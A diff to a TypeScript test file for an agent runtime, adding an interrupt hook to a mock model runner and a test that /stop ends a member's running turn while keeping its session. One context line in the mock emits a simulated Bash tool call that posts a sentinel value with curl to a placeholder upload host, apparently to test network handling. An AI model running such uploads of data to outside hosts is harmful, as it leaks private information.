@@ -17,6 +17,7 @@ import type { JudgmentAccess } from '@jungjaehoon/mama-core';
 import type { ActionIpcServerOptions } from '@jungjaehoon/mama-core/client/ipc';
 import type { IModelRunner } from '@jungjaehoon/mama-core/runtime/drivers/types';
 import { SessionPool } from '@jungjaehoon/mama-core/runtime/session-pool';
+import { NativeTurnStoppedError } from '@jungjaehoon/mama-core/runtime/drivers/types';
 import { CodexRuntimeProcess } from '@jungjaehoon/mama-core/runtime/runtime-process';
 import { createOwnerRuntime, type OwnerRuntimeOptions } from '../../src/runtime/owner-runtime.js';
 import {
@@ -139,6 +140,7 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
   let failMember = false;
   let ownerGate: Promise<void> | undefined;
   let memberGate: Promise<void> | undefined;
+  const stops = new Map<string, (error: Error) => void>();
   let networkSentinel: string | undefined;
   const options: OwnerRuntimeOptions = {
     backend,
@@ -196,8 +198,13 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
             key: opts?.sessionKey ?? '',
             context: opts?.toolExecutionContext,
           });
-          if (principal === 'owner' && ownerGate) await ownerGate;
-          if (principal !== 'owner' && memberGate) await memberGate;
+          // A held turn can be stopped (/stop) while it waits at its gate.
+          const key = opts?.sessionKey ?? '';
+          const stopped = new Promise<never>((_resolve, reject) => stops.set(key, reject));
+          void stopped.catch(() => {});
+          if (principal === 'owner' && ownerGate) await Promise.race([ownerGate, stopped]);
+          if (principal !== 'owner' && memberGate) await Promise.race([memberGate, stopped]);
+          stops.delete(key);
           if (networkSentinel) {
             callbacks?.onToolUse?.('Bash', {
               command: `curl -d ${networkSentinel} https://upload.example/private?q=${networkSentinel}`,
@@ -228,6 +235,13 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
         },
         resetSession: async (_id, key) => {
           started.delete(key!);
+        },
+        interrupt: async (_id, key) => {
+          const stop = stops.get(key);
+          if (!stop) return false;
+          stops.delete(key);
+          stop(new NativeTurnStoppedError());
+          return true;
         },
         setSessionId: () => {},
         setSystemPrompt: () => {},
@@ -951,6 +965,61 @@ it('starts a conversation over only while nothing of that person runs or waits (
     expect(await runtime.startOver({ kind: 'member', principalId: enrolled })).toBe('started_over');
     expect(runtime.runtime.servesPrincipal(enrolled)).toBe(true);
   } finally {
+    await runtime.stop();
+  }
+});
+
+it('stops the turn running in a conversation and keeps its session (/stop)', async () => {
+  const f = await fixture('claude');
+  const runtime = await createOwnerRuntime(f.options);
+  try {
+    const dm = { kind: 'member' as const, principalId: f.member };
+    const dmKey = `member:${f.member}:runtime`;
+    expect(await runtime.stopTurn(dm)).toBe('idle');
+    f.blockMember(new Promise<void>(() => {}));
+    const intake = runtime.memberIntake(f.member);
+    intake.acceptOwnerMessage({
+      id: 'fixture:member-stopped',
+      channelKey: 'fixture',
+      occurredAt: 4,
+      text: 'long request',
+    });
+    // The model has the turn once it recorded it; the pool marks the session busy before that.
+    await vi.waitFor(
+      () => expect(f.turns.filter((turn) => turn.principal === f.member)).toHaveLength(1),
+      { timeout: 5_000 }
+    );
+    expect(runtime.turnRunning(dm)).toBe(true);
+    const sessionId = f.pool.peekSession(dmKey).sessionId;
+    // The common session runs nothing; only the member's conversation is stopped.
+    expect(await runtime.stopTurn({ kind: 'common' })).toBe('idle');
+    expect(await runtime.stopTurn(dm)).toBe('stopped');
+    // The stopped input is left uncertain, as a turn failing after dispatch is: never rerun,
+    // and not pending, so the gateway tells its sender it was interrupted.
+    await vi.waitFor(
+      () =>
+        expect(
+          runtime.runtime.mailbox!.readInput('fixture:member-stopped', f.member)?.nativeDelivery
+            ?.state
+        ).toBe('uncertain'),
+      { timeout: 5_000 }
+    );
+    expect(intake.isPending!('fixture:member-stopped')).toBe(false);
+    expect(runtime.turnRunning(dm)).toBe(false);
+    // Unlike /new, the session stays for the next message.
+    expect(f.pool.peekSession(dmKey).sessionId).toBe(sessionId);
+    expect(await runtime.stopTurn(dm)).toBe('idle');
+    // A member not served in this process runs nothing.
+    const enrolled = createPrincipalRepository(runtime.database.adapter).registerMember({
+      connector: 'telegram',
+      namespace: 'private',
+      externalId: 'fixture-enrolled-stop',
+      now: 6,
+    });
+    expect(await runtime.stopTurn({ kind: 'member', principalId: enrolled })).toBe('idle');
+    expect(runtime.runtime.servesPrincipal(enrolled)).toBe(false);
+  } finally {
+    f.blockMember(undefined);
     await runtime.stop();
   }
 });
